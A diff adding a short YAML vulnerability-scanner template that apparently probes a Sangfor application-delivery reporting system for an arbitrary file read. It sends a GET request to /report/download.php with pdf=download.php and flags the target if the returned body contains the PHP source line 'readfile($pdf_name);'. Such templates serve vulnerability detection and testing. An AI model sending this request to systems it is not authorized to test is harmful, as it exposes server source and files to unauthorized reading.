@@ -1,0 +1,11 @@
+name: poc-yaml-sangfor-report-readfile
+rules:
+  - method: GET
+    path: /report/download.php?pdf=download.php
+    expression: |
+      response.status == 200 && response.body.bcontains(b'readfile($pdf_name);')
+detail:
+  author: sangfor-report-readfile
+  links:
+    - https://www.baidu.com
+    - app="SANGFOR-应用交付报表系统"
